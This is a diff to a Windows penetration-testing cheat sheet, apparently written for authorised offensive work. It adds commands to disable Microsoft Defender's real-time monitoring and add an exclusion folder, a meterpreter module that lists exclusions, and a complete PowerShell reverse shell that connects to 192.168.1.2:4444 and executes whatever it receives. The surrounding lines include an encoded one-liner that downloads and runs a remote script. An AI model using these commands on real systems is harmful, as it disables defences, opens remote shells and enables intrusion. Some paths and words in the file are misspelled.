@@ -38,6 +38,8 @@ Run task on system start.
 
 Run task on user idle for 30 minutes.
 
+<<<
+
 ==== Service Management
 
   sc query state=all
@@ -71,6 +73,21 @@ Allow a host.
 
 Allow a program.
 
+<<<
+
+==== Defender
+
+  Set-MpPreference -DisableRealTimeMonitoring $true
+
+Disable completely. Yields a ballon notification to logged on users.
+
+  Add-MpPreference -ExclusionPath "C:\Temp"
+
+Add excluded direectory.
+
+  use post/windows/gather/enum_av_excluded
+
+List off excluded directories from meterpreter session.
 
 ==== Exploits
 ===== MS08-067
@@ -106,6 +123,8 @@ Detection: Run `whoami /getprivs` and look for `SeImpersonate` or `SeAssignPrima
 
 This is a vulnerability in SMB that invites `NT_AUTHORITY/SYSTEM` access.
 
+<<<
+
 ==== Powershell
 
   C:\Windows\sjswow64\WindowsPowerShell\vl.O\powershell.exe
@@ -119,5 +138,9 @@ Download a powershell script to memory and run it.
   powershell.exe -w hidden -noni -nop -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMi9zY3JpcHQucHMxJyk7Cg==
 
 Same as above, but doesn't use either quote type.
+
+  $client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();
+
+Reverse shell
 
 <<<
